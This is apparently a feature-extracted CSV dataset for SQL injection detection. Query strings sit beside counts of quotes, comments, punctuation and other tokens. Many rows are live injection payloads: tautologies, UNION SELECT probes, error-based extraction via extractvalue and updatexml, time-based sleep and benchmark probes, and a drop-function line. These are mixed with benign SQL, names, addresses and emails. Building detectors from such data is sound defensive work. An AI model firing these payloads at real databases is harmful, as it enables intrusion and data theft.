,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
8547,"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,0,9,0,0,15,0,1,0,0,1,29,21,0,0,4.499809670330265,6.378649993862576
2921,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'nopu'  =  'nopu",4,0,28,0,0,36,0,2,1,0,1,54,32,0,3,5.303304908059076,8.031276926892037
1592,"-5616""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   ",0,1,33,0,0,54,0,1,6,0,0,71,35,7,2,5.541263545158426,8.559367492058051
21261,select sing ( s )  from deeply left join,0,0,2,0,0,8,0,0,0,0,0,29,0,0,2,3.688879454113936,4.897348914472564
13904,delfina,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
3240,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",3,0,12,0,0,14,0,1,1,0,0,40,8,0,2,4.48863636973214,6.357017110069445
23811,select * from door where one between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,32,16,0,1,4.189654742026425,5.791153910047609
23262,select * from student where third = 'mistake'  or came = 'seems',4,0,7,0,0,11,0,1,1,0,0,45,0,0,1,4.158883083359672,5.734313559436426
840," select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",0,1,12,1,0,20,0,1,3,0,0,49,3,0,2,4.574710978503383,6.524589271310591
228,or '7659'  =  '7659,3,0,4,0,0,3,0,0,0,0,0,2,8,0,0,2.9444389791664403,3.684523708911846
19328,"select user_id, meta_key, meta_value from wp_usermeta where user_id in  ( 1 )  order by umeta_id asc",0,0,10,0,0,15,0,0,0,0,0,72,1,0,2,4.605170185988092,6.584397772472616
16499,46266,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
776, or 1  =  1 --,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0,2.6390573296152584,3.2241419783899143
15588,alegra-dulantzi,0,0,1,0,0,0,0,0,1,0,0,14,0,0,0,2.70805020110221,3.326353218260614
28682,"insert into angry  ( memory, built, riding )  values  ( 'tried', 'seeing', 'finest' )  ",6,0,14,0,0,14,0,0,0,0,0,55,0,0,0,4.465908118654584,6.313121924766899
27718,select * from  ( select brick from sure ) ,0,0,3,0,0,9,0,0,1,0,0,29,0,0,2,3.737669618283368,4.981567234930947
12457,valido casademont,0,0,0,0,0,1,0,0,0,0,0,16,0,0,0,2.833213344056216,3.514446415767603
9448,"-2321%""  )   or 2271  =  7683--",0,1,7,1,0,5,1,1,3,0,0,2,12,0,0,3.4339872044851463,4.467059038127735
1129,1%' order by 1#,1,0,3,0,0,3,1,0,0,0,0,7,2,0,1,2.70805020110221,3.326353218260614
27371,select chest ( s )  from line union,0,0,2,0,0,7,0,0,0,0,0,25,0,0,1,3.555348061489413,4.669921102482963
20822,select min ( jet )  as money from transportation,0,0,2,0,0,8,0,0,0,0,0,37,0,0,1,3.871201010907891,5.215173163969822
24169,select top 50 percent * from bean,0,0,1,0,0,6,0,0,1,0,0,24,2,0,2,3.49650756146648,4.571113592379885
24411,"  select waste as her, like as [popular]  from shore",0,0,3,0,0,9,0,0,0,0,0,38,0,0,1,3.951243718581428,5.357417698153898
10000,"-9371'  )   union all select 5900,5900,5900#",1,0,6,0,0,5,0,0,1,0,0,14,16,0,1,3.784189633918261,5.062431490914847
8467,"-1550' in boolean mode  )   union all select 9777,9777,9777--",1,0,7,1,0,8,0,0,3,0,0,27,16,0,1,4.110873864173311,5.646144513813471
24242,select * from do where moment = 'beneath',2,0,4,0,0,7,0,0,1,0,0,30,0,0,1,3.713572066704308,4.939896154656966
24028,select evening ( s )  from choice union all,0,0,2,0,0,8,0,0,0,0,0,32,0,0,1,3.7612001156935615,5.022400427811018
3147,"1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,0,26,1,0,36,0,1,3,0,1,48,40,0,3,5.2832037287379885,7.987507728218879
8086,-4001'   )    )    or 5634  =  4044--,1,0,7,1,0,6,0,1,3,0,0,2,12,0,0,3.610917912644224,4.764024421755989
11419,s5bal850de,0,0,0,0,0,0,0,0,0,0,0,6,4,0,0,2.302585092994046,2.7402564225600523
1985,1'+  (  select trte where 9173  =  9173 and 2006  =  2006,1,0,5,0,0,11,0,1,1,0,0,18,17,0,1,4.04305126783455,5.522643883333643
15865,7106,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
19474,select wp_posts.* from wp_posts where id in  ( 367661 ) ,0,0,6,0,0,10,0,0,1,0,0,33,6,0,1,4.02535169073515,5.490616172199279
12525,canal saracho,0,0,0,0,0,1,0,0,0,0,0,12,0,0,0,2.5649493574615367,3.1155015354702966
9432,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""mynm"" like ""mynm",0,4,10,0,0,14,0,2,0,0,1,30,22,0,0,4.499809670330265,6.378649993862576
1046,1'  )   where 6622  =  6622 order by 1--,1,0,5,1,0,8,0,0,2,0,0,12,10,0,1,3.688879454113936,4.897348914472564
3697,1 and 9412  =  6877#,0,0,2,0,0,4,0,1,0,0,0,3,9,0,0,2.995732273553991,3.7638991627446954
4015,select   (  case when   (  2717  =  2634  )   then 2717 else 2717*  (  select 2717 from mysql.db  )   end  )  #,0,0,10,0,0,21,0,0,1,0,0,42,20,0,2,4.709530201312334,6.791357624410744
23392,select * from stepped fetch first 3 rows only select top 50 percent * from speak,0,0,2,0,0,15,0,0,2,0,0,60,3,0,5,4.382026634673881,6.152384767567401
14465,hardwick@corjet.gh,0,0,2,0,0,0,0,0,0,0,0,16,0,0,0,2.8903717578961645,3.6015010896570807
25973,select * from swam where pencil between 'rays' and 'according',4,0,5,0,0,9,0,1,1,0,0,48,0,0,1,4.127134385045092,5.675937336868984
24649,"insert into stay  ( caught, mainly, find )  values  ( 'model', 'mean', 'giving' )  ",6,0,14,0,0,14,0,0,0,0,0,51,0,0,0,4.418840607796598,6.222685223035155
2471,"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,0,10,0,0,12,1,1,0,0,0,11,10,0,0,4.07753744390572,5.5852871348767055
29072,select * from off order by wealth desc,0,0,1,0,0,7,0,0,1,0,0,30,0,0,2,3.6375861597263857,4.809458789423759
22804,select * from suggest fetch first 3 rows only select top 50 percent * from porch,0,0,2,0,0,15,0,0,2,0,0,60,3,0,5,4.382026634673881,6.152384767567401
14583,08zaril0o,0,0,0,0,0,0,0,0,0,0,0,6,3,0,0,2.19722457733622,2.593591245490939
15966,subhashi,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
30503,select continent ( s ) from ice inner join,0,0,2,0,0,8,0,0,0,0,0,32,0,0,2,3.737669618283368,4.981567234930947
27833,select avg ( instance ) from spite,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.5263605246161616,4.621137163019105
16005,leuco vilca,0,0,0,0,0,1,0,0,0,0,0,10,0,0,0,2.3978952727983707,2.8749024412290907
11412,micaas,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
13892,"c/ meneses, 104 6-a",0,0,3,0,0,3,0,0,2,0,0,9,4,0,0,2.9444389791664403,3.684523708911846
26269,select * from made where connected not between 'aboard' and 'aware',4,0,5,0,0,10,0,2,1,0,0,52,0,0,1,4.204692619390966,5.819025031871101
10761,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",2,0,28,0,0,39,0,1,3,0,1,59,40,0,4,5.3706380281276624,8.17883688583344
15651,br8c99ma4290,0,0,0,0,0,0,0,0,0,0,0,5,7,0,0,2.4849066497880004,2.999482870035824
1028,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",1,0,9,0,0,5,0,0,1,0,0,14,28,0,1,4.07753744390572,5.5852871348767055
25751,select * from  ( select serious from salt ) ,0,0,3,0,0,9,0,0,1,0,0,31,0,0,2,3.784189633918261,5.062431490914847
1218,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""xccy""  =  ""xccy",0,4,25,0,0,28,0,2,0,0,1,48,35,0,1,5.220355825078324,7.851491318972704
25718,select * from neighborhood where zero = 'earlier',2,0,4,0,0,7,0,0,1,0,0,38,0,0,1,3.8918202981106265,5.251655965920898
12170,eoin,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
14038,60781516z,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
29878,select top 3 * from managed select * from upon 3select * from down,0,0,3,0,0,13,0,0,3,0,0,48,2,0,3,4.189654742026425,5.791153910047609
7773,"1%'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,21,1,0,20,1,1,3,0,0,63,10,0,2,4.897839799950911,7.1729298517346045
13093,33971,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
27877,select distinct meet from got,0,0,0,0,0,4,0,0,0,0,0,25,0,0,1,3.367295829986474,4.357111686472804
1298,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",0,1,9,0,0,8,0,0,0,7,0,47,9,7,1,4.31748811353631,6.030055566276218
11445,sanidad,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
1898,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",0,1,7,0,0,13,0,1,0,0,0,19,10,0,1,4.143134726391533,5.7053230539652695
14407,chirlern,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
23191,select * from perfectly where describe = 'fairly' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,56,1,0,3,4.290459441148391,5.97916802637938
28930,select count ( struck )  from teach,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.555348061489413,4.669921102482963
7627,"1   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   8475  =  8475",0,0,26,0,0,38,0,2,1,0,1,46,40,0,3,5.351858133476067,8.137533919888101
28268,select afternoon,0,0,0,0,0,1,0,0,0,0,0,15,0,0,1,2.772588722239781,3.4229084603450888
17116,"calle salvador de madariaga s/n,",0,0,2,0,0,4,0,0,1,0,0,26,0,0,0,3.4657359027997265,4.519779854678687
9220,1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,1,0,7,0,0,11,0,1,1,0,0,16,13,0,0,4.04305126783455,5.522643883333643
10487,"1'||  (  select 'yags' where 6268  =  6268 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",4,0,22,0,0,27,0,3,1,0,0,87,16,0,3,5.153291594497779,7.707729168265067
16623,1.77e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
25592,select connected ( s ) from tightly inner join,0,0,2,0,0,8,0,0,0,0,0,36,0,0,2,3.828641396489095,5.140218969441503
27920,select * from safety fetch first 50 percent rows onlyselect top 3 * from powerful,0,0,2,0,0,14,0,0,2,0,0,62,3,0,4,4.394449154672439,6.17606445953937
16247,beilul,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
14601,3m6noja4,0,0,0,0,0,0,0,0,0,0,0,5,3,0,0,2.079441541679836,2.432300417938136
6584,"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1,21,1,0,20,1,1,3,0,0,62,10,0,2,4.890349128221754,7.157548893414895
10424,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",0,1,10,0,0,4,0,0,1,0,0,14,36,0,1,4.158883083359672,5.734313559436426
16251,"palomares, 2 11b",0,0,1,0,0,2,0,0,0,0,0,10,3,0,0,2.772588722239781,3.4229084603450888
16341,8.34e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
20070,select bin ( 111 ) ;,0,0,3,0,0,5,0,0,0,0,0,9,3,0,1,2.995732273553991,3.7638991627446954
6518,1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'esal'  =  'esal,4,0,65,0,0,79,0,12,0,0,0,86,45,10,1,5.934894195619588,9.474525631026046
24875,select avg ( basket ) from problem,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.5263605246161616,4.621137163019105
12692,mauer,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
9978,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,0,0,57,0,0,72,0,12,0,0,0,92,53,10,1,5.857933154483459,9.291408593243675
15590,pruja lantadilla,0,0,0,0,0,1,0,0,0,0,0,15,0,0,0,2.772588722239781,3.4229084603450888
14634,escultor damian forment 128 11?g,0,0,1,0,0,4,0,0,0,0,0,22,5,0,0,3.4657359027997265,4.519779854678687
1148,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",4,0,28,0,0,30,0,3,0,0,1,48,47,0,2,5.241747015059643,7.897645461863443
21956,"  select orders.towerrid, employees.them, employees.its from ordersright join employees on orders.employeeid  =  employees.exactlyid order by orders.valleyid",0,0,9,0,0,15,0,0,0,0,0,130,0,0,3,5.056245805348308,7.502190543098655
30530,select * from important where habit = 'parent',2,0,4,0,0,7,0,0,1,0,0,35,0,0,1,3.828641396489095,5.140218969441503
18960,afiligr*anado,0,0,1,0,0,0,0,0,1,0,0,12,0,0,0,2.5649493574615367,3.1155015354702966
1423,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",0,4,22,0,0,28,0,2,1,0,0,75,8,0,2,5.135798437050262,7.6704624710446145
17722,70136564l,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
7873,-9541 where 4291  =  4291 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char ,0,0,31,0,0,55,0,1,7,0,0,66,43,8,1,5.541263545158426,8.559367492058051
13852,das,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,1.0986122886681098,1.19230319601282
5501,"1"" where 7022  =  7022",0,1,2,0,0,4,0,0,0,0,0,5,9,0,0,3.091042453358316,3.9129887722739327
28316,select top 3 * from sleep where major = 'parallel' select * from quarter,2,0,5,0,0,13,0,0,2,0,0,53,1,0,3,4.276666119016055,5.953276820822519
9036,-2658  )   as casi where 7364  =  7364 or 8245  =  9651--,0,0,6,1,0,11,0,1,3,0,0,13,20,0,0,4.04305126783455,5.522643883333643
4022,1 where 9774  =  9774,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0,3.044522437723423,3.839958531231341
17519,miner@zing.lk,0,0,2,0,0,0,0,0,0,0,0,11,0,0,0,2.5649493574615367,3.1155015354702966
23984,select * from bush fetch first 50 percent rows onlyselect top 3 * from cookies,0,0,2,0,0,14,0,0,2,0,0,59,3,0,4,4.356708826689592,6.104257869167092
16568,"c/ valdepalitos 155, 5-a",0,0,3,0,0,3,0,0,2,0,0,14,4,0,0,3.1780538303479458,4.05093304771096
16355,voglis@hiperxxx.au,0,0,2,0,0,0,0,0,0,0,0,16,0,0,0,2.8903717578961645,3.6015010896570807
19149,tz_offset,0,0,1,0,0,0,0,0,0,0,0,8,0,0,0,2.19722457733622,2.593591245490939
13924,toi,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,1.0986122886681098,1.19230319601282
8116,"1'  )   where 9381  =  9381 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,0,11,1,0,16,0,1,2,0,0,15,18,0,0,4.356708826689592,6.104257869167092
431," or 1  =  1 or """"  =  ",0,2,4,0,0,8,0,2,0,0,0,4,2,0,0,3.091042453358316,3.9129887722739327
3775,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",0,1,10,1,0,5,0,0,3,0,0,14,28,0,1,4.0943445622221,5.615932130190505
662," select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",0,2,8,1,0,18,0,2,3,0,0,26,5,0,1,4.143134726391533,5.7053230539652695
3169,"1'   )    )    as tfub where 3461  =  3461 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,0,27,1,0,32,0,4,2,0,0,47,24,4,0,5.087596335232384,7.56826919695837
6690,"1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )  ",0,0,12,0,0,23,0,0,1,0,0,48,20,0,1,4.787491742782046,6.948051004895869
27358,select * from bar where ants between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,32,16,0,1,4.189654742026425,5.791153910047609
15657,escribano peraldo,0,0,0,0,0,1,0,0,0,0,0,16,0,0,0,2.833213344056216,3.514446415767603
10084,if  (  4907  =  9581  )   select 4907 else drop function apqw--,0,0,5,1,0,11,0,0,2,0,0,28,12,0,1,4.143134726391533,5.7053230539652695
16772,cojera,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
12025,massaguer molin,0,0,0,0,0,1,0,0,0,0,0,14,0,0,0,2.70805020110221,3.326353218260614
14246,clara,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
8973,1'  )   where 2840  =  2840,1,0,3,0,0,5,0,0,0,0,0,5,9,0,0,3.295836866004329,4.240494654101009
25722,select * from family where national = 'note'  or her = 'burn',4,0,7,0,0,11,0,1,1,0,0,42,0,0,1,4.110873864173311,5.646144513813471
26482,"  select typical,look,shells from below left join orders on border.moodid =  accurate.although order by studying.purpose",0,0,6,0,0,14,0,0,0,0,0,98,0,0,3,4.787491742782046,6.948051004895869
7977,1  )   and 3861  =  5813--,0,0,4,1,0,5,0,1,2,0,0,3,9,0,0,3.258096538021482,4.179397132269193
18841,"plaza aparejador federico bermudez 139,",0,0,1,0,0,4,0,0,0,0,0,31,3,0,0,3.6635616461296463,4.853884482035236
7503,"1""  )   as sraw where 1997  =  1997 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",0,1,32,1,0,46,0,1,4,0,1,60,79,0,4,5.6240175061873385,8.747391878570212
22010,select min ( not )  as compound from bar,0,0,2,0,0,8,0,1,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
16706,1729,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
2452,"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",4,0,21,0,0,24,0,3,1,0,0,47,21,0,3,4.934473933130692,7.248396945100476
15107,3.56e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
16263,kavid,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
21888,select * from likely order by common desc,0,0,1,0,0,7,0,0,1,0,0,33,0,0,2,3.713572066704308,4.939896154656966
4532,"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",0,1,7,1,0,13,0,0,2,0,0,21,10,0,0,4.0943445622221,5.615932130190505
3541,select   (  case when   (  8978  =  1426  )   then 1 else 8978*  (  select 8978 from master..sysdatabases  )   end  )  --,0,0,12,1,0,21,0,0,3,0,0,53,17,0,2,4.795790545596741,6.964836608637794
9644,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",2,3,16,0,0,17,0,1,1,0,0,46,10,0,1,4.74493212836325,6.862288715935788
12422,corsini-vischer@viajesdacapalla.nl,0,0,3,0,0,0,0,0,1,0,0,31,0,0,0,3.5263605246161616,4.621137163019105
17322,kaycee,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
28715,select count ( grabbed ) from origin,0,0,2,0,0,6,0,0,0,0,0,28,0,0,2,3.58351893845611,4.717530264472627
18065,46510,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
28765,select * from live,0,0,1,0,0,3,0,0,1,0,0,14,0,0,1,2.8903717578961645,3.6015010896570807
6132,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",0,0,12,0,0,20,0,1,1,0,0,71,8,0,2,4.836281906951478,7.047030967710781
7329,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,0,3,11,0,0,12,1,1,0,0,1,23,15,0,1,4.356708826689592,6.104257869167092
18602,96804276j,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
18400,lladurs,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
6035,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",1,0,13,1,0,4,0,0,3,0,0,14,44,0,1,4.31748811353631,6.030055566276218
28912,select avg ( during )  from buy  select sum ( brown ) ,0,0,4,0,0,12,0,0,0,0,0,36,0,0,4,3.9889840465642745,5.42506920217274
2824,1'   )    )    and 3814  =  4272--,1,0,6,1,0,6,0,1,2,0,0,3,9,0,0,3.5263605246161616,4.621137163019105
17864,jochen,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
24728,select grew from observe,0,0,0,0,0,3,0,0,0,0,0,21,0,0,1,3.1780538303479458,4.05093304771096
3552,1  )   where 4573  =  4573,0,0,2,0,0,5,0,0,0,0,0,5,9,0,0,3.258096538021482,4.179397132269193
19436,select option_value from wp_options where option_name  =  '_options_middle_button_link' limit 1,2,0,10,0,0,9,0,0,0,0,0,73,1,0,1,4.553876891600541,6.483834243658689
23094,select min ( saw )  as instance from either,0,0,2,0,0,8,0,0,0,0,0,32,0,0,1,3.7612001156935615,5.022400427811018
5312,"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",5,0,22,1,0,24,0,2,3,0,0,47,23,0,1,4.976733742420574,7.335959393126002
16769,589ecialid6d,0,0,0,0,0,0,0,0,0,0,0,8,4,0,0,2.4849066497880004,2.999482870035824
12097,5.58e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
21369,select fox from first union select breakfast from mouse order by silk,0,0,0,0,0,11,0,0,0,0,0,58,0,0,3,4.23410650459726,5.873719016140452
4155,-3062'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth,4,0,10,0,0,12,0,2,1,0,0,17,12,0,0,4.23410650459726,5.873719016140452
20460,select count ( roomid ) from tobacco,0,0,2,0,0,6,0,0,0,0,0,28,0,0,2,3.58351893845611,4.717530264472627
10489,"1'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,0,19,0,0,23,0,0,0,0,1,50,23,0,0,5.010635294096256,7.406597807788619
28669,select * from action where breath = 'chicken',2,0,4,0,0,7,0,0,1,0,0,34,0,0,1,3.80666248977032,5.101693885125393
14804,2.72e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
20763,"   select phrase, done+ ', ' + explore+ ' ' + husband+ ', ' + stone as plural  from circle",6,0,15,0,0,19,0,0,6,0,0,53,0,0,1,4.499809670330265,6.378649993862576
20595,select * from six where needs = 'pleasant'  and city = 'breathe',4,0,7,0,0,11,0,1,1,0,0,45,0,0,1,4.158883083359672,5.734313559436426
22495,select top 3 * from become,0,0,1,0,0,5,0,0,1,0,0,19,1,0,2,3.258096538021482,4.179397132269193
28475,select * from remarkable where army = 'face'  and city = 'massage',4,0,7,0,0,11,0,1,1,0,0,47,0,0,1,4.189654742026425,5.791153910047609
22780,"insert into stranger ( outside, choice, too, sea, root, smile )  values  ( 'likely', 'third'. deep', 'adult', 'straw', 'energy', 'dog' )  ",13,0,28,0,0,21,0,0,0,0,0,86,0,0,0,4.927253685157205,7.2334909053693135
3888,"1'+  (  select lhtn where 8484  =  8484 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",2,0,46,0,0,55,0,6,2,2,0,87,35,9,1,5.631211781821365,8.76384624518976
20453,select * from invented where remember between 'nearer' and 'rose',4,0,5,0,0,9,0,1,1,0,0,51,0,0,1,4.174387269895637,5.762920220853171
12060,coomonte,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
29522,"  select afterid as id, having as fruit from partly",0,0,1,0,0,9,0,0,0,0,0,40,0,0,1,3.9318256327243257,5.322755734775789
23680,select * from circus where house = 'island' limit 3,2,0,4,0,0,9,0,0,1,0,0,37,1,0,1,3.9318256327243257,5.322755734775789
3638,"1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090",0,0,44,0,0,54,0,7,0,2,0,74,37,9,0,5.616771097666572,8.730835859060681
